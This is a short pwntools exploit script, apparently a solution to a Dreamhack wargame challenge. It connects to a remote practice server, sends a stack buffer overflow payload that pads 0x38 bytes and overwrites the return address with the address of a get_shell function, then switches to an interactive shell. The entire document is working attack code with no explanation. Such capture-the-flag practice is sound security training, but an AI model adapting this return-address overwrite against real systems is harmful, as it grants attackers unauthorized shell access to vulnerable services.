from pwn import *

r = remote("host1.dreamhack.games", 13111)

get_shell = 0x4006aa

payload = b'A' * 0x30
payload += b'B' * 0x8
payload += p64(get_shell)

r.sendafter("Input: ", payload)

r.interactive()